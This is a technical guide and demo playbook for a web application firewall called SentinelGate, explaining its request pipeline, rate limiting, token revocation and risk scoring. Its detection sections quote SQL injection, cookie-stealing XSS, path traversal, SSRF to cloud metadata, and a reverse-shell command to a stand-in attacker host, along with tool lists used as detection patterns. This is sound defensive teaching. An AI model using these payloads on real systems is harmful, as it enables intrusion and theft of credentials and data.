# SentinelGate — The Complete A to Z Architecture, Plain-English Technical Guide & Review Playbook

---

# PART I: THE BIG PICTURE (WHAT, WHY, & HOW)

## 1. What Is SentinelGate in Plain English?

Imagine a high-security corporate building. 

In a traditional office, once a visitor walks past the front doors, they can wander anywhere they want—into executive suites, the server room, or the accounting department. Nobody asks who they are once they are inside. 

**SentinelGate is the opposite: it operates under "Zero-Trust".** 

SentinelGate is like a permanent, hyper-intelligent security checkpoint stationed directly in front of all doors inside the building. It intercepts every single visitor (every HTTP request), inspects everything they are carrying (their URL, headers, and request body), checks their behavior history (how fast they are typing, whether they just failed 10 passwords in a row), gives them a **Dynamic Risk Score**, and instantly blocks them if they show malicious intent—all in less than a millisecond, before they ever touch your actual application or database.

Technically, SentinelGate is a **Zero-Trust Web Application Security Gateway and Web Application Firewall (WAF)** acting as a **Reverse Proxy**.

```
[The Internet / Users / Attackers]
                │
                ▼
┌────────────────────────────────────────────────────────┐
│             TLS / HTTPS Termination (Nginx)            │
│         (Decrypts the secure traffic at the door)       │
└───────────────────────┬────────────────────────────────┘
                        │
                        ▼
┌────────────────────────────────────────────────────────┐
│                 SENTINELGATE GATEWAY                   │
│                                                        │
│  1. Checkpoint: Anti-Spoofing & Traffic Guards         │
│  2. Pipeline: IP Blocklist & Rate Limiting             │
│  3. Deep Inspection: WAF Threat Detection Engine       │
│  4. Intelligence: Dynamic Multi-Signal Risk Scorer     │
│  5. Decision: Policy Engine (Allow vs. Block)          │
│  6. Audit: Cryptographic Tamper-Evident HMAC Logging   │
└───────────────────────┬────────────────────────────────┘
                        │ (Only clean, verified requests pass)
                        ▼
┌────────────────────────────────────────────────────────┐
│               YOUR BACKEND APPLICATION                 │
│         (User Databases, Core APIs, Services)          │
└────────────────────────────────────────────────────────┘
```

---

## 2. Why Does SentinelGate Exist? (The Real-World Problems It Solves)

Most web applications today are protected by either nothing at all, or a basic cloud firewall. Here are the 6 major blind spots that attackers exploit every day, and how SentinelGate fixes them:

### Problem 1: Perimeter Blindness
* **The Flaw**: Traditional firewalls trust traffic once it is "inside" the internal network or coming from an authorized IP.
* **The Danger**: If an attacker compromises a single container, employee laptop, or VPN connection, they have free rein to attack every internal database.
* **SentinelGate's Solution**: **Never Trust, Always Verify**. Every request is inspected and scored, whether it originates from the public internet or an internal microservice.

### Problem 2: "Evasion" (Tricking Naive Firewalls)
* **The Flaw**: Basic firewalls search for obvious bad words like `' OR 1=1` or `<script>`.
* **The Danger**: Attackers use encoding tricks (like double URL-encoding `%2527` or writing HTML entities `&lt;script&gt;`). The simple firewall reads the encoded gibberish, thinks it is safe, and passes it through. The backend application then decodes it and runs the attack!
* **SentinelGate's Solution**: A **6-Stage Evasion Normalization Pipeline** that unpacks, double-decodes, and unmasks every string into plain text *before* checking for attacks.

### Problem 3: All-or-Nothing Binary Decisions
* **The Flaw**: Traditional firewalls only know two things: 100% clean or 100% blocked.
* **The Danger**: An attacker can run automated vulnerability scanners, test 4 wrong passwords, and send requests from automated CLI tools (`curl`). Because no single action trips a hard blocking rule, the attacker stays invisible.
* **SentinelGate's Solution**: A **Dynamic Risk Scoring Engine (0 to 100)**. Each suspicious clue adds risk points. Even if no single clue triggers a block, a combination of clues pushes the score over the limit, halting the attack.

### Problem 4: Botnets and Volumetric Abuse
* **The Flaw**: Simple rate limiters count requests per IP address.
* **The Danger**: Modern botnets rotate through millions of IPv6 addresses or fake their `X-Forwarded-For` headers, spreading requests across so many addresses that standard rate limiters never trigger.
* **SentinelGate's Solution**: **Trusted Proxy CIDR Walking** (to prevent header spoofing) and **IPv6 /48 Prefix Aggregation** (grouping trillions of IP addresses from the same ISP subnet into one shared counter).

### Problem 5: Stateless JWT Token Invalidation
* **The Flaw**: Modern web apps use JSON Web Tokens (JWT) for authentication. By design, JWTs are stateless—once created, they cannot be cancelled until they expire (often days or weeks later).
* **The Danger**: If a user logs out, or an employee is fired, or a token is stolen, the token still works!
* **SentinelGate's Solution**: An ultra-fast **Redis `jti` Blocklist**. The instant someone clicks "Log Out", their token's unique ID is blacklisted in Redis in under 1 millisecond.

### Problem 6: Log Tampering After a Breach
* **The Flaw**: Security logs are typically stored in standard SQL database tables.
* **The Danger**: Once an attacker compromises an administrator account, they delete or modify the logs to erase all evidence of their intrusion.
* **SentinelGate's Solution**: **Cryptographic HMAC-SHA256 Chaining**. Every log entry contains a cryptographic seal linked to the previous log entry. If a single comma or timestamp is altered in the database, the entire chain breaks, immediately exposing the tampering.

---

# PART II: THE REQUEST LIFECYCLE (STEP-BY-STEP)

When an HTTP request arrives at SentinelGate, it travels through 5 distinct stages:

```
[Client Request]
       │
       ▼
┌────────────────────────────────────────────────────────┐
│ STAGE 1: INGRESS GUARDS & ANTI-SPOOFING                │
│ (Assigns UUID, validates IP, checks size & timeout)    │
└───────────────────────┬────────────────────────────────┘
                        │
                        ▼
┌────────────────────────────────────────────────────────┐
│ STAGE 2: THE ORDERED SECURITY PIPELINE                 │
│ (IP Blocklist ➔ Rate Limiting ➔ Brute Force ➔ WAF)     │
└───────────────────────┬────────────────────────────────┘
                        │
                        ▼
┌────────────────────────────────────────────────────────┐
│ STAGE 3: MULTI-SIGNAL RISK SCORER                      │
│ (Calculates 0–100 score from all collected clues)      │
└───────────────────────┬────────────────────────────────┘
                        │
                        ▼
┌────────────────────────────────────────────────────────┐
│ STAGE 4: POLICY DECISION & EXECUTION                   │
│ (ALLOW, ALLOW+LOG, or BLOCK with 403/429/405)          │
└───────────────────────┬────────────────────────────────┘
                        │
                        ▼
┌────────────────────────────────────────────────────────┐
│ STAGE 5: EGRESS SECURITY HARDENING                     │
│ (Injects HSTS, CSP, nosniff, and Telemetry Headers)    │
└────────────────────────────────────────────────────────┘
```

---

# PART III: DEEP DIVE INTO EVERY SUBSYSTEM

---

## 1. Ingress Guards & Anti-Spoofing (`backend/gateway.py` & `backend/network.py`)

### A. Request Correlation ID (`X-Request-ID`)
* **What it is**: A unique UUIDv4 fingerprint generated for every request (e.g., `8f3b2a7e-1234-4567-89ab-cdef01234567`).
* **Why it matters**: In modern cloud systems, a single user click might touch 10 different microservices. By attaching this ID to every log line, database record, and HTTP response, engineers can trace the entire lifecycle of an incident in one search.

### B. Client IP Anti-Spoofing (Trusted Proxy CIDR Walking)
* **The Analogy**: A letter arrives at your house with a return address claiming to be "The White House". Do you believe it? Only if the postal service you trust verified it.
* **How Attackers Exploit It**: Attackers send requests with a fake header: `X-Forwarded-For: 1.1.1.1` to pretend they are a trusted corporate IP or bypass rate limits.
* **How SentinelGate Fixes It**:
  1. SentinelGate checks the physical connection IP (the direct peer).
  2. If the direct peer is NOT on our list of `trusted_proxies` (like our internal Nginx load balancer), **we throw away the `X-Forwarded-For` header completely**.
  3. If the direct peer IS trusted, SentinelGate reads the `X-Forwarded-For` list **backwards (right to left)**, discarding internal proxy hops until it finds the first real, untrusted external IP.

### C. IPv6 /48 Prefix Aggregation (Loophole 15)
* **The Analogy**: If a troublemaker lives in Apartment 101, gets kicked out, and then moves to Apartment 102, 103, and 104 in the same building to keep harassing you.
* **How Attackers Exploit It**: In IPv6, an internet service provider gives a single user billions of addresses. An attacker writes a script that changes their IP on every request to bypass rate limits.
* **How SentinelGate Fixes It**: SentinelGate takes the first 48 bits (the `/48` CIDR network prefix) of any IPv6 address. Every single IP within that same block shares the exact same rate-limiting counter. Address hopping is rendered completely useless.

### D. Streaming Payload Size Guard (1 MB Hard Limit)
* **How Attackers Exploit It**: Attackers attempt "Denial of Service" (DoS) by uploading a 10 GB file or sending an endless stream of bytes without declaring a `Content-Length` header (Slowloris attack), freezing the server.
* **How SentinelGate Fixes It**:
  1. Quick check: If `Content-Length > 1 MB`, reject instantly with **HTTP 413 Payload Too Large**.
  2. Streaming check: SentinelGate counts bytes chunk-by-chunk as the body streams in. The instant the counter passes 1,048,576 bytes, the connection is cut.

### E. Request Execution Timeout (30s)
* Any slow or hanging database query is capped at 30 seconds using `asyncio.wait_for`. If it exceeds this, SentinelGate terminates it with **HTTP 504 Gateway Timeout** and records a `+15` risk penalty.

---

## 2. Authentication, Token Lifecycle & RBAC (`backend/auth/`)

### A. Password Security
* Passwords are never stored in plain text. They are hashed using **`bcrypt`** with automated salting. Salting ensures that even if two users choose the exact same password (`Password123!`), their hashes look completely different in the database, preventing rainbow table attacks.

### B. Dual-Token Architecture
1. **Access Token (Short-lived, 15 minutes)**: A lightweight digital key carried in the Authorization header. It holds user information: User ID, Username, and Role (`ADMIN`, `ANALYST`, or `USER`).
2. **Refresh Token (Long-lived, 7 days)**: Kept securely. When the 15-minute access token expires, the client sends the refresh token to `/auth/refresh` to get a new pair without forcing the user to log in again.

### C. Immediate Token Revocation via Redis `jti` Blocklist (Loophole 2)
* **The Analogy**: A hotel keycard. Normally, a keycard works until its checkout date. But if you lose your wallet, the front desk cancels your specific card serial number immediately.
* **How SentinelGate Implements It**:
  - Every issued token has a unique UUID called a **`jti`** (JWT ID).
  - When a user logs out (`POST /auth/logout`), SentinelGate writes that `jti` into Redis with a countdown timer (TTL) matching the token's remaining lifespan.
  - On every single request, SentinelGate checks Redis. If the `jti` is found, the request is rejected with **HTTP 401 Unauthorized**.

### D. Hierarchical Role-Based Access Control (RBAC)
* Access is strictly tiered: `ADMIN` > `ANALYST` > `USER`.
* `require_admin`: Only administrators can change WAF rules or unblock IPs.
* `require_analyst_or_admin`: Analysts can view security event logs, audit trails, and live feeds.
* `require_user`: Regular users can only access their own profile and application data.

---

## 3. Sliding-Window Rate Limiting & Progressive Brute-Force (`backend/rate_limiter/`)

### A. The "Sliding Window" Algorithm Explained
* **Why Fixed Windows Fail**: In a fixed-window system (e.g., 100 requests per clock minute), an attacker sends 100 requests at `00:59` and another 100 requests at `01:01`. That is **200 requests in 2 seconds**—and the server crashes!
* **How Sliding Window Solves It**: Imagine a moving 60-second video tape rolling continuously. SentinelGate counts how many requests you sent in the *last 60 seconds from right now*.

```
Time Axis (seconds):
[--------- 60-second Rolling Window ---------] NOW
   •    ••  •••   •     ••     •    •   [New Request!]
   └───────────────────────────────────┘
   Count = 11 requests in the rolling window.
   If limit is 10 ➔ 429 Too Many Requests!
```

### B. Concurrency Safety & Zero TOCTOU Race Conditions (Loophole 4)
* **What is TOCTOU?** "Time-of-Check to Time-of-Use". If 10 requests hit the server at the exact same millisecond, a naive system checks: "Count is 9 (safe)" 10 times, and allows all 10 in, resulting in 19 requests (double the limit)!
* **How SentinelGate Solves It**:
  - SentinelGate uses Redis **Sorted Sets (`ZSET`)** inside an atomic pipeline transaction (`MULTI/EXEC`).
  - Redis executes the commands on a single thread in one indivisible step:
    1. Remove old timestamps (`ZREMRANGEBYSCORE`).
    2. Count current timestamps (`ZCARD`).
    3. Add new timestamp (`ZADD`).
    4. Set expiration (`EXPIRE`).
  - It is mathematically impossible for another request to sneak in between the check and the increment.

### C. Tiered Protection Limits
* **`/auth/login`**: 10 req / 60s (Stops credential stuffing).
* **`/security/*`**: 50 req / 60s (Protects security endpoints).
* **`/api/*`**: 200 req / 60s (Smooth API usage).
* **Global Default**: 100 req / 60s (Broad protection).

### D. Progressive Escalation Brute-Force Defense (Loophole 5)
When someone attacks the login endpoint with wrong passwords, SentinelGate escalates punishment dynamically:
* **1 to 4 failed logins**: Normal behavior (user might have mistyped).
* **5 failed logins**: System triggers a warning alert and adds **`+20` risk**.
* **10 failed logins**: Automatic **Temporary Block (15 minutes)** + **`+40` risk**. The IP is written to the persistent blocklist.
* **20 failed logins**: Automatic **Extended Block (24 hours)** + **`+60` risk**.
* **Successful login**: Counter is completely cleared.

---

## 4. WAF Threat Detection Engine (`backend/threat_detection/`)

The WAF performs deep inspection across all parts of the request.

### A. The 6-Stage Evasion Normalization Pipeline
Attackers try to hide their exploits inside layers of encoding. SentinelGate cleanses the input through 6 sequential steps before any detection rule touches it:

1. **First URL Decode**: Converts standard encoding like `%20` into a space.
2. **Second URL Decode (Loophole 6)**: Neutralizes double-encoding. For example, `%2527` becomes `%27` in step 1, and then becomes `'` (a single quote) in step 2!
3. **HTML Entity Decode**: Converts `&lt;` into `<`, `&gt;` into `>`, and `&#x27;` into `'`.
4. **Unicode NFC Normalization (Loophole 7)**: Converts visual homoglyphs (characters that look identical but have different computer codes) into standard canonical UTF-8.
5. **Null Byte Stripping**: Deletes `\x00` and `%00`, which attackers use to truncate file paths in older systems.
6. **Lowercasing**: Converts everything to lowercase so `SeLeCt` matches `select`.

---

### B. OWASP Top 10 Attack Detection Rules

#### 1. SQL Injection (SQLi)
* **What the attack is**: The attacker types SQL commands into input boxes to trick the database into handing over user records or deleting tables.
  - *Example*: `' OR 1=1 --` turns a login check `WHERE user='' AND pass=''` into `WHERE user='' OR 1=1`, logging in without a password!
* **How SentinelGate detects it**: Matches boolean tautologies (`OR 1=1`), `UNION SELECT`, stacked queries (`DROP TABLE`, `INSERT INTO`), comments (`--`, `#`, `/*`), and timing delays (`SLEEP(5)`).
* **False-Positive Guard**: Real people have names like `john o'brien` or search for `select few items` or `drop shipment`. SentinelGate enforces word boundaries and syntax structure so legitimate phrases are **never blocked**.
* **Result**: Blocks immediately with **HTTP 403 Forbidden** (+60 risk).

#### 2. Cross-Site Scripting (XSS)
* **What the attack is**: The attacker injects malicious JavaScript code into a website. When another user views that page, the script executes in their browser, stealing their session cookies.
  - *Example*: `<script>alert(document.cookie)</script>` or `<img src=x onerror=alert(1)>`.
* **How SentinelGate detects it**: Scans for script tags, event handlers (`onerror=`, `onload=`), `javascript:` pseudo-protocols, and DOM sinks (`document.cookie`, `eval(`).
* **False-Positive Guard**: Text with math or emojis like `"I love <3 pizza"` or `"Price: $4.99"` is recognized as harmless and allowed.
* **Result**: Blocks immediately with **HTTP 403 Forbidden** (+55 risk).

#### 3. Path Traversal
* **What the attack is**: The attacker uses `../` (dot-dot-slash) to escape out of the website's public folder and view private files on the host computer.
  - *Example*: `../../../../etc/passwd` (stealing user accounts on Linux) or `..\..\windows\system32\config\sam` (stealing password hashes on Windows).
* **How SentinelGate detects it**: Identifies directory climb sequences (`../`, `..\`), Unix sensitive files (`/etc/passwd`, `/proc/self/`), Windows system directories, and hidden dotfiles (`.env`, `.git`).
* **Result**: Blocks immediately with **HTTP 403 Forbidden** (+55 risk).

#### 4. Command Injection
* **What the attack is**: The attacker tricks the server into executing real operating system terminal commands.
  - *Example*: `; whoami` or `| nc attacker.com 4444` (opening a reverse shell so the hacker gets full command-line control of your computer).
* **How SentinelGate detects it**: Identifies command chaining operators (`;&|`) followed by shell commands (`whoami`, `cat`, `curl`, `wget`, `bash`, `python`), backtick execution (`` `id` ``), and subshells (`$(...)`).
* **Result**: Blocks immediately with **HTTP 403 Forbidden** (+70 risk - Critical).

#### 5. Server-Side Request Forgery (SSRF) (Loophole 8)
* **What the attack is**: The attacker tricks the server into acting as their personal proxy to reach private internal servers or cloud credentials that are not accessible from the public internet.
  - *Example*: Asking the server to fetch `http://169.254.169.254/latest/meta-data/` (the internal AWS metadata endpoint where temporary Amazon cloud master keys live!).
* **How SentinelGate detects it**: Inspects URLs, query strings, and body fields for internal addresses: `127.0.0.1`, `localhost`, `169.254.169.254`, private company subnets (`10.x`, `192.168.x`), and dangerous protocols (`file://`).
* **Result**: Blocks immediately with **HTTP 403 Forbidden** (+65 risk).

#### 6. Suspicious User-Agent Profiling (Loophole 10)
* **What it is**: Identifies automated hacking scanners (`sqlmap`, `nikto`, `burpsuite`, `nmap`), empty user-agents, buffer-overflow strings ($> 500$ chars), and CLI tools (`curl`, `wget`).
* **Special Design**: **Non-blocking signal**. SentinelGate does NOT immediately block a request just because it came from `curl` (since legitimate developers use `curl`). Instead, it adds `+10` to `+25` risk points. If combined with other suspicious actions, the total score will cross the threshold and block.

#### 7. HTTP Method Abuse (Loophole 9)
* **What it is**: Attackers use obscure HTTP verbs like `TRACE` (which echoes credentials back to the user in Cross-Site Tracing attacks) or send `GET` requests to actions that modify data.
* **How SentinelGate detects it**:
  1. Universally blocks dangerous verbs (`TRACE`, `TRACK`, `CONNECT`) with **HTTP 405 Method Not Allowed**.
  2. Enforces strict verb rules on endpoints (e.g., `/auth/login` ONLY accepts `POST`).

---

## 5. Dynamic Multi-Signal Risk Scoring Engine

Rather than relying on isolated "yes/no" rules, SentinelGate computes an intelligent **0 to 100 Risk Score** for every request:

$$\text{Final Risk Score} = \min\left(100, \sum \text{Threats} + \sum \text{Behaviors} + \sum \text{Context} + \sum \text{Auth} + \text{Compound Bonus}\right)$$

### The Scoring Matrix:
```
BASE SCORE: 0

Attack Patterns Detected:
  Command Injection              +70
  SSRF Attack                    +65
  SQL Injection                  +60
  Cross-Site Scripting (XSS)     +55
  Path Traversal                 +55

Behavioral Clues:
  Rate Limit Exceeded            +20
  Rate Limit Near 80% Capacity   +10
  Brute-Force (5-9 failed logins)+20
  Brute-Force (10-19 failed)     +40
  Brute-Force (20+ failed)       +60

Context Clues:
  Known Hacker Scanner (sqlmap)  +25
  Empty / Missing User-Agent     +15
  CLI Tool (curl, wget)          +10
  HTTP Method Violation          +15
  Oversized Payload              +10
  Originating from Blocked IP    +50
  Compound Attack Multiplier     +15  (Added when 2+ different attack types appear in 1 request)

Authentication Clues:
  Missing Token on Private Route +5
  Expired or Invalid Token       +10
  Revoked Token (jti blacklisted)+30
```

### Risk Classifications (Round-Up Rule)
* **0 to 29 (LOW)**: Safe, legitimate traffic. Allowed through.
* **30 to 59 (MEDIUM)**: Suspicious traffic (e.g. `curl` client approaching rate limit). Allowed through, but logged with an **INFO/WARN audit record** for analysts.
* **60 to 79 (HIGH)**: Clear attack attempt (e.g. SQLi or XSS attempt). **Blocked with HTTP 403 Forbidden**.
* **80 to 100 (CRITICAL)**: Severe, high-confidence exploit (e.g. Command Injection, SSRF, or multi-vector attack). **Blocked with HTTP 403** and pushed as an **urgent real-time alert** to the security dashboard!

---

## 6. Policy Decision Engine & Response Hardening

### The Decision Table:
| Calculated Risk | Decision Action | HTTP Status | What SentinelGate Does |
|---|---|---|---|
| **0 – 29** | `ALLOW` | Upstream Status | Forwards request to backend application cleanly. |
| **30 – 59** | `ALLOW + LOG` | Upstream Status | Forwards request; records an audit event in the database. |
| **60 – 79** | `BLOCK` | 403 Forbidden | Rejects request; logs security incident; alerts analysts. |
| **80 – 100** | `BLOCK + ALERT` | 403 Forbidden | Rejects request; logs incident; pushes instant WebSocket alert to dashboard. |

### The Standard Blocked JSON Response
When a request is blocked, SentinelGate returns clean, descriptive JSON:
```json
{
  "status": "blocked",
  "request_id": "8f3b2a7e-1234-4567-89ab-cdef01234567",
  "risk_score": 85,
  "risk_level": "CRITICAL",
  "threats": ["SQL_INJECTION"],
  "message": "Request blocked by SentinelGate security policy.",
  "timestamp": "2026-09-16T22:45:00Z"
}
```

### Security Headers Injected on ALL Responses (Allow AND Block)
Even when returning an error or blocking an attacker, SentinelGate injects hardened headers to protect the client browser:
* `Strict-Transport-Security (HSTS)`: Forces the browser to communicate exclusively over encrypted HTTPS for the next year.
* `Content-Security-Policy (CSP)`: Disallows malicious scripts from running or loading external images/frames.
* `X-Content-Type-Options: nosniff`: Stops the browser from guessing mime-types, preventing drive-by executable downloads.
* `X-Frame-Options: DENY`: Prevents the website from being loaded inside an invisible iframe (Clickjacking defense).
* `X-Request-ID`: The unique trace ID for that transaction.
* `X-Risk-Score`: The exact risk score calculated for that request.
* `X-Risk-Level`: `LOW`, `MEDIUM`, `HIGH`, or `CRITICAL`.

---

## 7. Audit Logging & Cryptographic HMAC Chaining (`backend/audit/`)

### A. High-Speed Non-Blocking Queue
Logging to a database is normally slow. If every web request waits for a database write, your application crawls. SentinelGate uses an **in-memory async queue (`asyncio.Queue`)**. Security events are popped into the queue in nanoseconds, and a background worker drains the queue and writes records in fast bulk batches.

### B. Tamper-Evident HMAC-SHA256 Chaining (Loophole 13)
* **The Analogy**: Numbered, signed pages in a legal contract. If someone tears out Page 4, the missing page is immediately obvious.
* **How It Works**:
  - Each recorded security event contains an `hmac_chain` cryptographic signature.
  - The signature is calculated by hashing the current event's data combined with the **signature of the previous event**:
    $$\text{HMAC}_n = \text{HMAC-SHA256}(\text{Secret Key}, \text{Previous HMAC} + \text{Request ID} + \text{Timestamp} + \text{Risk Score} + \text{Action})$$
  - If a corrupt database administrator or a hacker alters even a single character in an old log row, all subsequent HMAC hashes in the chain become invalid.
  - Admins can verify log integrity at any time via `GET /security/integrity/verify`.

---

## 8. Real-Time Telemetry & The Security Dashboard

SentinelGate includes a responsive, dark-mode Next.js analyst dashboard:
* **Live WebSocket Stream (`/ws/security-events`)**:
  - Whenever an attack is blocked or risk exceeds 30, the gateway pushes the complete event over a persistent WebSocket connection directly to the analyst's screen in under 5 milliseconds.
* **Visual Capabilities**:
  - **Animated Risk Gauge**: Shows the real-time threat temperature of the entire platform.
  - **Attack Breakdown Donut**: Live visualization of attack types (SQLi vs. XSS vs. Path Traversal vs. SSRF).
  - **Live Scrolling Event Feed**: Displays incoming attacks with instant click-to-inspect modals showing raw request bodies, decoded strings, and matched rules.
  - **WAF Rules Manager**: An administrative toggle switch panel allowing security leads to enable/disable rules or inspect the active IP blocklist.

---

# PART IV: THE 20 SECURITY LOOPHOLES RESOLVED

This quick-reference matrix shows how SentinelGate solves the 20 classic vulnerabilities that plague standard gateways:

| # | Vulnerability | How SentinelGate Solves It in Plain English |
|---|---|---|
| **1** | Missing HTTPS/TLS | Nginx terminates TLS 1.3/1.2 with HSTS headers before reaching the gateway. |
| **2** | Stateless JWTs Can't Be Revoked | Redis `jti` blocklist instantly revokes logged-out tokens. |
| **3** | Unprotected Dashboard | Dashboard is guarded by `httpOnly` session cookies and strict RBAC (`ADMIN`/`ANALYST`). |
| **4** | Rate Limiter Race Conditions | Redis `MULTI/EXEC` pipeline transactions guarantee atomic, thread-safe counter checks. |
| **5** | Brute-Force Counters Disconnected | Dedicated `bf:{ip}:{user}` counters escalate from warnings into persistent IP blocks. |
| **6** | Double-Encoded WAF Bypasses | Normalizer decodes URLs twice (`%2527` $\rightarrow$ `%27` $\rightarrow$ `'`) before running regex. |
| **7** | Unicode Homoglyph Bypasses | Normalizer converts all visually similar Unicode characters into standard NFC format. |
| **8** | SSRF Overlooked | Dedicated SSRF rule blocks access to AWS/GCP metadata (`169.254.169.254`), loopbacks, and RFC1918. |
| **9** | HTTP Method Abuse | Universally rejects `TRACE`/`TRACK`/`CONNECT` (405) and enforces per-endpoint allowed verbs. |
| **10** | Suspicious User-Agents Ignored | Automated scanners (`sqlmap`, `nikto`, `burp`) are detected and contribute risk points. |
| **11** | Unbounded Payload Crash (DoS) | Checks `Content-Length` and enforces a hard 1 MB streaming limit chunk-by-chunk. |
| **12** | Untraceable Requests | Assigns a unique `X-Request-ID` UUID to every request, context, log, and response header. |
| **13** | Database Log Tampering | Tamper-evident HMAC-SHA256 hash chains link each event to the previous record. |
| **14** | Blocklists Lost on Server Reboot | IP blocklist lives in fast Redis and is permanently saved in the SQL database table. |
| **15** | IPv6 Botnet Address Hopping | Aggregates all IPv6 clients into `/48` CIDR blocks, sharing one rate-limit counter. |
| **16** | Leaky Health Check Endpoint | Health check reveals only `status: ok` and is restricted to internal access. |
| **17** | Risk Score Ambiguity | Strict ceiling at 100 with clear round-up classification (e.g. 60 = HIGH, 80 = CRITICAL). |
| **18** | False-Positive Headaches | Precise grammar-aware regexes plus IP and Path allowlists to bypass known safe services. |
| **19** | Slowloris / Hanging Requests | Enforces an automatic 30-second wall-clock timeout on all request processing. |
| **20** | Token Theft via LocalStorage | Dashboard stores JWTs in `httpOnly`, `Secure`, `SameSite=Strict` cookies immune to script theft. |

---

# PART V: REVIEW DEFENSE & DEMO PLAYBOOK

---

## 1. Top 5 Questions Panel Reviewers Will Ask (And Your Answers)

### Q1: "Why build a custom gateway instead of just using Cloudflare or AWS WAF?"
* **Your Answer**:
  > *"Commercial edge firewalls are black boxes that only look at raw text and return a generic 403. They have zero understanding of the application's internal state. SentinelGate is an application-aware Zero-Trust gateway. It correlates the user's login identity, their role, their token revocation state, their failed login history, and payload inspection into a single unified 0–100 Risk Score. Furthermore, SentinelGate provides an immutable HMAC cryptographic audit trail, which commercial edge firewalls do not offer."*

### Q2: "Why use a Sliding Window instead of a Token Bucket for rate limiting?"
* **Your Answer**:
  > *"Token Bucket allows 'boundary bursts'. A client can empty its bucket at the end of a minute, and empty a fresh bucket at the start of the next minute—sending double the allowed traffic in 2 seconds. A Sliding Window evaluates a continuous, rolling 60-second window. By executing the window query and increment inside an atomic Redis pipeline transaction (`MULTI/EXEC`), we also guarantee zero race conditions under high concurrency."*

### Q3: "What is your defense against double URL-encoding?"
* **Your Answer**:
  > *"In double-encoding, an attacker encodes `'` as `%27`, and then encodes the percent sign as `%2527`. A naive WAF inspects `%2527`, finds no attack, and forwards it. The downstream application then decodes it into a live attack! SentinelGate prevents this by running all inputs through a 6-stage Evasion Normalization Pipeline that decodes URLs twice, resolves HTML entities, normalizes Unicode, and strips null bytes before pattern matching."*

### Q4: "What happens if Redis or the database crashes? Does SentinelGate fail open or closed?"
* **Your Answer**:
  > *"SentinelGate is built on Zero-Trust fail-secure principles. If Redis is unavailable, the rate limiter and blocklists fall back to a local in-memory lock-guarded cache. If any security check encounters an unhandled exception, the pipeline adds a `+25` fail-secure penalty to the risk score, blocking unmonitored traffic. It never fails open."*

### Q5: "How do you ensure you don't block legitimate users who have apostrophes in their names?"
* **Your Answer**:
  > *"We engineered our rules with syntactic precision rather than simplistic substring matching. For example, our SQL injection rule doesn't just look for an apostrophe; it requires an apostrophe combined with SQL logic like `OR 1=1` or `UNION SELECT`. Legitimate inputs like `john o'brien` or `select few items` or `<3 pizza` pass through without false-positive blocks."*

---

## 2. Live Demo Playbook (What to Stress & How to Present)

When presenting your live demo, **focus on dynamic reactions, attack interception, and real-time observability.**

### 🌟 The 4 Core Messages to Emphasize:
1. **Zero-Trust Intelligence**: Every single request is actively evaluated and tagged with risk.
2. **Evasion Resilience**: Simple WAFs miss double-encoding; SentinelGate catches it every time.
3. **Behavioral Analytics**: Rate limits and brute force aren't just blocks; they dynamically drive the risk engine.
4. **Transparent Observability**: Every response carries telemetry headers (`X-Request-ID`, `X-Risk-Score`, `X-Risk-Level`).

---

### Step-by-Step Demo Flow:

#### Step 1: Clean Traffic Baseline
* **Action**: Send a clean GET request to `/health` or login with valid credentials.
* **What to Show**:
  - The request succeeds (HTTP 200).
  - Point out the response headers: `X-Request-ID` (tracking UUID), `X-Risk-Score: 0`, `X-Risk-Level: LOW`.
  - Point out the security headers: `Strict-Transport-Security`, `Content-Security-Policy`, `X-Frame-Options: DENY`, `X-Content-Type-Options: nosniff`.

#### Step 2: Direct SQL Injection vs. Double-Encoded Evasion
* **Action 1**: Send `GET /auth/login?search=' OR 1=1 --`.
  - **Show**: Blocked instantly with **HTTP 403 Forbidden**. Body returns `"threats": ["SQL_INJECTION"]` and `risk_score: 60+`.
* **Action 2**: Send double-encoded: `GET /auth/login?search=%2527%2520OR%25201%253D1`.
  - **Show**: Also blocked with **HTTP 403 Forbidden**!
  - **What to Say**: *"Notice that even though the query parameter contained `%2527`, which looks harmless to basic firewalls, our Evasion Normalizer peeled back the encoding layer, recognized the SQL injection, and stopped it."*

#### Step 3: Nested JSON XSS vs. False-Positive Precision
* **Action 1**: Send a POST body with malicious nested JSON:
  `{"username": "<script>alert(document.cookie)</script>", "password": "Password123!"}`
  - **Show**: Blocked with **HTTP 403 Forbidden**, `"threats": ["XSS"]`.
  - **What to Say**: *"Our engine doesn't just check query parameters; it recursively unpacks complex JSON bodies."*
* **Action 2**: Send a legitimate name with special characters:
  `{"username": "john_o'brien", "password": "Password123!"}`
  - **Show**: It is **NOT blocked by the WAF**. It reaches the auth handler and returns HTTP 401 (invalid credentials).
  - **What to Say**: *"This proves our false-positive precision. Real users with apostrophes or punctuation can use the system without being locked out."*

#### Step 4: Atomic Rate Limiting (No Race Conditions)
* **Action**: Fire 15 requests to `/auth/login` within 5 seconds.
* **What to Show**:
  - The first 10 requests pass.
  - The 11th request triggers **HTTP 429 Too Many Requests**.
  - Show the header: `X-Risk-Score: 20`, `threat: RATE_LIMIT_EXCEEDED`.
  - **What to Say**: *"Because this uses Redis atomic MULTI/EXEC transactions, there is zero race condition—even under extreme concurrent load, the 10-request limit is enforced with mathematical precision."*

#### Step 5: Progressive Brute-Force Lockout
* **Action**: Send 5 failed login attempts with wrong passwords, then 10.
* **What to Show**:
  - At 5 failures: Risk score jumps by `+20` (credential stuffing detected).
  - At 10 failures: The IP is placed on the **persistent blocklist** for 15 minutes.
  - Send any new request from that IP: It is stopped dead at Stage 1 (`ip_blocklist_check`) before touching any backend code!

#### Step 6: HTTP Method Abuse & Scanner Fingerprinting
* **Action 1**: Send a `TRACE` request or `GET /auth/login`.
  - **Show**: Returns **HTTP 405 Method Not Allowed**.
* **Action 2**: Send a request with `User-Agent: sqlmap/1.6#stable`.
  - **Show**: The scanner tool is fingerprinted, and contextual risk is assigned to the session.
